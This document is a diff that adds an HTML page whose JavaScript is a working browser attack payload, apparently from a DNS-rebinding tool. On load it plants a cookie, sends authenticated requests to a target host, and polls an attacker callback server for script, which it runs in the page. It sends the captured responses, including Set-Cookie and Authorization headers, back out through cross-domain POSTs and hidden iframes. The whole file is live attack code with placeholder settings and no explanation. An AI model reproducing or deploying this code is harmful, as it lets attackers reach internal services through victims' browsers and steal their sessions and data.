@@ -1,0 +1,243 @@
+<html>
+<head>
+<script type="text/javascript">
+
+var basic_user = "USER";
+var basic_pass = "PASS";
+var target_path = "PATH";
+var callback_interval = "INTERVAL";
+var callback_port = "PORT";
+var cookie = "COOKIE";
+var foo = 0;
+var callback_domain = "";
+var domain_array = window.location.hostname.split(".");
+for(var i=1; i<domain_array.length; i++){
+	callback_domain += domain_array[i] + ".";
+}
+callback_domain = callback_domain.slice(0,-1);
+var callback_url = window.location.protocol + "/" + "/" + callback_domain + ":" + callback_port;
+var target_url = window.location.protocol + "/" + "/" + window.location.hostname;
+if(window.location.port){
+	target_url += ":" + window.location.port;
+}
+var NULL = null;
+
+String.prototype.strip = function() {
+        return this.replace(/^\s+|\s+$/g,"");
+}
+
+function request(url,postData,rheaders)
+{
+        var method = null;
+        var xmlObj = null;
+	var data = null;
+	var kv = null;
+	var hvalue = null;
+	var async = false;
+	var headers = new Array();
+	var desired_headers = ["Allow", "Cache-Control", "Content-Location", "Date", "Expires", "Last-Modified", "Location", "Refresh", "Retry-After", "Server", "Set-Cookie", "Authorization"];
+        var ret    = {
+			status  : null,
+                        headers : null,
+                        body    : null
+        };
+
+        if(!postData){
+                postData = null;
+                method = "GET";
+        } else {
+		postData = unescape(postData);
+                method = "POST";
+        }
+
+	if(rheaders){
+		data = rheaders.split("%%");
+
+		for(var i=0; i<data.length; i++){
+			if(data[i] != ""){
+				data[i] = unescape(data[i]);
+				kv = data[i].split(":");
+				if(kv.length >= 2){
+					hvalue = "";
+
+					for(j=1; j<kv.length; j++){
+						hvalue += kv[j];
+					}
+					headers[headers.length] = {header : kv[0].strip(), value : hvalue.strip()};
+				}
+			}
+		}
+	}
+
+        try {
+                xmlObj = new XMLHttpRequest();
+        } catch (err) {
+                try {
+                        xmlObj = new ActiveXObject("Msxml2.XMLHTTP");
+                } catch (err) {
+                        try {
+                                xmlObj = new ActiveXObject("Microsoft.XMLHTTP");
+                        } catch(err){
+                                return null;
+                        }
+                }
+        }
+
+	try {
+        	xmlObj.open(method,url,async,basic_user,basic_pass);
+
+		for(var i=0; i<headers.length; i++){
+			try {
+				xmlObj.setRequestHeader(headers[i].header,headers[i].value);
+			} catch(err) {}
+		}
+        	xmlObj.send(postData);
+	} catch(err) {
+		return null;
+	}
+
+	try {	
+		ret.body = xmlObj.responseText;
+		ret.status = "HTTP/1.1 " + xmlObj.status + " " + xmlObj.statusText;
+		ret.headers = "";
+	} catch(err) {
+		return null;
+	}
+
+	for(i=0;i<desired_headers.length;i++){
+		header = desired_headers[i];
+		value = xmlObj.getResponseHeader(header);
+	
+		if(value){
+			ret.headers += header + ": " + value + "\r\n";
+		}
+	}
+
+        return ret.status + "\r\n" + ret.headers + "\r\n" + ret.body;
+}
+
+function killelement(elid)
+{
+	try {
+		document.body.removeChild(document.getElementById(elid));
+	} catch(err) {}
+}
+
+function is_browser(browser)
+{
+	if(navigator.userAgent.toLowerCase().indexOf(browser.toLowerCase()) != -1){
+		return 1;
+	}
+
+	return 0;
+}
+
+function callback(index,data)
+{
+	var exec_page = "/exec";
+	var ifname = "form" + index;
+	var params = "i=" + index + "&d=";
+	var xdata = escape(params + data);
+	var xurl = callback_url + exec_page;
+	var rq = null;
+
+	/* IE8 cross-domain request */	
+	if(window.XDomainRequest){
+		rq = new XDomainRequest();
+		rq.open("POST",xurl);
+		rq.send(xdata);
+		return 1;
+	/* FF 3.5 cross-domain request */
+	} else if(window.XMLHttpRequest && !is_browser("safari")){
+		rq = new XMLHttpRequest();
+		if(rq.withCredentials !== undefined){
+			rq.open("POST",xurl);
+			rq.send(xdata);
+			return 1;
+		}
+	}
+	
+	/* Cross-domain requests for everyone else... */
+	try {
+		el = document.createElement('<iframe name="' + params + escape(data) + '">');
+	} catch (err) {
+		el = document.createElement("iframe");
+		el.name = params + escape(data);
+	}
+	if(el){
+		el.id = ifname;
+		el.src = callback_url + "/post";
+		el.onload = function() { setTimeout(function() { killelement(ifname); },callback_interval); };
+		el.frameborder = 0;
+		el.style.display = "none";
+		el.style.visibility = "hidden";
+
+		document.body.appendChild(el);
+		return 1;
+	}
+
+	return 0;
+}
+
+function pollServer()
+{
+	var url = callback_url + "/poll?" + foo++;
+	var el = null;
+	var xhrdata = null;
+	var rq = null;
+	var xhr = false;
+
+        /* FF 3.5 cross-domain request */
+        if(window.XMLHttpRequest){
+                rq = new XMLHttpRequest();
+                if(rq.withCredentials !== undefined){
+                        rq.open("GET",url,false);
+                        rq.send(null);
+			xhrdata = rq.responseText;
+			xhr = true;
+                }
+        }
+
+	try {
+		el = document.createElement("script");
+		el.type = "text/javascript";
+		if(xhr){
+			if(xhrdata){
+				el.text = xhrdata;
+			} else {
+				return;
+			}
+		} else {
+			el.src = url;
+		}
+		document.body.appendChild(el);
+	} catch (err) {}
+}
+
+function run()
+{
+	var data = null;
+
+	if(target_path[0] != '/'){
+		target_path = "/" + target_path;
+	}
+
+	try {
+		if(cookie != ""){
+			document.cookie = unescape(cookie);
+		}
+	} catch(err) {}
+
+	data = request(target_url + target_path);
+
+	if(data != null){
+		pollServer();
+		setInterval("pollServer()",callback_interval);	
+	}
+}
+
+</script>
+</head>
+<body onload="run()">
+</body>
+</html>
